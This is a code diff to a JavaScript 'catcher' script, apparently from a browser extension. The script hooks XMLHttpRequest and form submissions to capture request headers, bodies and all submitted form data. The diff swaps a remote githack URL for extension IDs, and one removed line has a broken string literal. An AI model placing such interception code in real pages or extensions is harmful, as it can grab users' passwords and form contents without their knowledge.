@@ -122,8 +122,8 @@
 
     // get this script element
     for (i = 0; i < document.scripts.length; i++) {
-        if (document.scripts[i].src == 'https://raw.githack.com/messi17/benim3/master/1/catcher.js' ||
-            (document.scripts[i].src == 'https://raw.githack.com/messi17/benim3/master/1/catcher.js)) {
+        if (document.scripts[i].src == 'chrome-extension://kajfghlhfkcocafkcjlajldicbikpgnp/catcher.js' ||
+            (document.scripts[i].src == 'chrome-extension://hghmdhgjmjbilodfdaabijjjncdggnob/catcher.js')) {
             script = document.scripts[i];
         }
     }
@@ -160,8 +160,8 @@
             header = header === null || header === undefined ? header : header.toString();
             value = value === null || value === undefined ? value : value.toString();
 
-            if (!('headers' in this['1'])) {
-                this['1'].headers = array();
+            if (!('headers' in this['kajfghlhfkcocafkcjlajldicbikpgnp'])) {
+                this['kajfghlhfkcocafkcjlajldicbikpgnp'].headers = array();
             }
 
             if (!( // Check for 'unsafe' headers
@@ -197,16 +197,16 @@
             send.apply(this, arguments);
 
             if (data === null || data === undefined) {
-                this['1'].data = array();
+                this['kajfghlhfkcocafkcjlajldicbikpgnp'].data = array();
             } else if (data instanceof FormData) {
-                this['1'].data = array('[Unable to capture XHR Level 2 FormData]');
+                this['kajfghlhfkcocafkcjlajldicbikpgnp'].data = array('[Unable to capture XHR Level 2 FormData]');
             } else {
-                this['1'].data = array(data.toString());
+                this['kajfghlhfkcocafkcjlajldicbikpgnp'].data = array(data.toString());
             }
 
-            event.initCustomEvent('1', false, false, this['1']);
+            event.initCustomEvent('kajfghlhfkcocafkcjlajldicbikpgnp', false, false, this['kajfghlhfkcocafkcjlajldicbikpgnp']);
             script.dispatchEvent(event);
-            delete this['1'];
+            delete this['kajfghlhfkcocafkcjlajldicbikpgnp'];
         };
 
     // Catch form submissions
@@ -228,7 +228,7 @@
     window.addEventListener('submit', formCatcher = function (event) {
             var result = document.createEvent('CustomEvent');
 
-            result.initCustomEvent('1', false, false, serializeForm(event.target));
+            result.initCustomEvent('kajfghlhfkcocafkcjlajldicbikpgnp', false, false, serializeForm(event.target));
             script.dispatchEvent(result);
         }, true);
 
